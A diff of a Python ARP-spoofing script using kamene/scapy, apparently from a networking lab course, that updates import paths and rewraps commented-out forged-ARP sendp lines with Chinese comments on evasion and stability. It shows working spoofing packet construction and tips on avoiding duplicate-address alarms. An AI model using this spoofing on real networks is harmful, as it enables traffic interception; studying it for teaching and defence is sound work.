@@ -11,10 +11,10 @@ import logging
 
 logging.getLogger("kamene.runtime").setLevel(logging.ERROR)  # 清除报错
 from kamene.all import *
-from part1_classic_protocols.tools.get_ip_netifaces import get_ip_address  # 导入获取本机IP地址方法
-from part1_classic_protocols.tools.get_mac_netifaces import get_mac_address  # 导入获取本机MAC地址方法
-from ARP_Request import arp_request  # 导入之前创建的ARP请求脚本
-from part1_classic_protocols.tools.scapy_iface import scapy_iface  # 获取scapy iface的名字
+from tools.get_ip_netifaces import get_ip_address  # 导入获取本机IP地址方法
+from tools.get_mac_netifaces import get_mac_address  # 导入获取本机MAC地址方法
+from net_1_arp.arp_request import arp_request  # 导入之前创建的ARP请求脚本
+from tools.scapy_iface import scapy_iface  # 获取scapy iface的名字
 import time
 import signal
 
@@ -41,9 +41,11 @@ def arp_spoof(ip_1, ip_2, ifname='Net1'):
               iface=scapy_iface(g_ifname),
               verbose=False)
         # op=1,请求ARP
-        # sendp(Ether(src=localmac, dst=ip_1_mac)/ARP(op=1, hwsrc=localmac, hwdst=ip_1_mac, psrc=g_ip_2, pdst=g_ip_1), iface = g_ifname, verbose = False)
+        # sendp(Ether(src=localmac, dst=ip_1_mac)/ARP(op=1, hwsrc=localmac, hwdst=ip_1_mac, psrc=g_ip_2, pdst=g_ip_1),
+        # iface = g_ifname, verbose = False)
         # 以太网头部的src MAC地址与ARP数据部分的hwsrc MAC不匹配攻击效果相同
-        # sendp(Ether(src=ip_1_mac, dst=ip_1_mac)/ARP(op=1, hwsrc=localmac, hwdst=ip_1_mac, psrc=g_ip_2, pdst=g_ip_1), iface = g_ifname, verbose = False)
+        # sendp(Ether(src=ip_1_mac, dst=ip_1_mac)/ARP(op=1, hwsrc=localmac, hwdst=ip_1_mac, psrc=g_ip_2, pdst=g_ip_1),
+        # iface = g_ifname, verbose = False)
         # 如果采用dst为二层广播，会造成被伪装设备告警地址重叠，并且欺骗效果不稳定，容易抖动！
         print("发送ARP欺骗数据包！欺骗" + ip_1 + ',本机MAC地址为' + ip_2 + '的MAC地址！！！')
         time.sleep(1)
